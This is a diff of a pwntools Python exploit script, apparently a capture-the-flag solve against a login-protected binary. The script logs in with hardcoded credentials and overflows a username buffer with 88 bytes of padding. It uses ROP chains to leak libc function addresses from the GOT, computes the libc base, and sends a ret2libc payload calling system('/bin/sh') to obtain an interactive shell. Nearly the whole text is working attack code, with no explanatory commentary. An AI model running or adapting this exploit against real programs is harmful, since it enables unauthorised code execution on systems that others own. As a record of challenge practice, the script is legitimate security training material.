@@ -48,7 +48,7 @@ def start(argv=[], *a, **kw):
 # ./exploit.py GDB
 gdbscript = """
 tbreak main
-b *main+305
+b *main+345
 continue
 """.format(
     **locals()
@@ -65,6 +65,10 @@ continue
 # Stripped:   No
 # Debuginfo:  Yes
 
+# creds
+login_user = "hoover95"
+login_pass = "7123308"
+
 
 def leave_prog(io: connect | process):
     # assumes starting from "> "
@@ -79,45 +83,84 @@ def change_username(io: connect | process, payload: bytes):
     io.recvuntil(b"> ")
 
 
+def login(io: process | connect, username = login_user, password = login_pass):
+    # login
+    io.recvuntil(b"name: ")
+    io.sendline(username.encode("ascii"))
+    io.recvuntil(b"code: ")
+    io.sendline(password.encode("ascii"))
+    io.recvuntil(b"> ")
+
+
 io = start()
 
 # logging
 io.info("Getting the host flag via. buffer overflow.")
 
 # from the binary
-target_user = "cristina33"
-target_pass = "01843101"
-login_user = "hoover95"
-login_pass = "7123308"
 
 # user_t struct size
 buffer_size = 32
-struct_size = buffer_size * 2
-
-# logging in
-io.recvuntil(b"name: ")
-io.sendline(login_user.encode("ascii"))
-io.recvuntil(b"code: ")
-io.sendline(login_pass.encode("ascii"))
+struct_size = 72
+payload_size = 88
 
 # function imports
-syms = ["puts", "printf", "memcpy", "fgets", "exit"]
+syms = ["puts", "printf", "exit", "fgets"]
+addrs = {}
 
 # creating a rop chain
 rop = ROP(exe)
 for sym in syms:
-    rop.puts(exe.got[sym])
-rop.main()
+    # logging in 
+    login(io)
 
-payload = b"A" * (buffer_size + 8) # for rbp
+    # rop chain
+    rop = ROP(exe)
+    rop.puts(exe.got[sym])
+    rop.main()
+
+    # payload
+    payload = b"A" * payload_size
+    payload += rop.chain()
+    
+    # sending it
+    io.debug(f"Leaking function addresses.")
+    io.debug(rop.dump())
+    change_username(io, payload)
+    
+    # activating the rop chain
+    leave_prog(io)
+
+    # getting address
+    addrs[sym] = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\0'))
+    io.info(f"Leaked address of {sym}@libc: {hex(addrs[sym])}.")
+
+# setting libc
+libc = ELF("../../libc.so.6")
+if libc == None:
+    io.failure("Couldn't load libc.so.6 from pwn/, cannot complete solve.")
+
+# asserting libc addresses
+libc.address = addrs[syms[0]] - libc.sym[syms[0]]
+assert libc.address & 0xfff == 0
+for sym in syms:
+    io.debug(f"{sym}: {hex(libc.sym[sym])}@libc, {hex(addrs[sym])}@leak")
+    #assert libc.sym[sym] == addrs[sym]
+
+# forming ret2libc
+login(io)
+
+# exploit
+rop = ROP(libc)
+rop.raw(rop.ret)
+rop.system(next(libc.search(b"/bin/sh")))
+payload = b"A" * payload_size
 payload += rop.chain()
 
-# sending it
-io.info(f"Leaking function addresses.")
-io.info(rop.dump())
+# sending exploit
 change_username(io, payload)
-
-# activating the rop chain
 leave_prog(io)
 
+# enjoy the shell
 io.interactive()
+
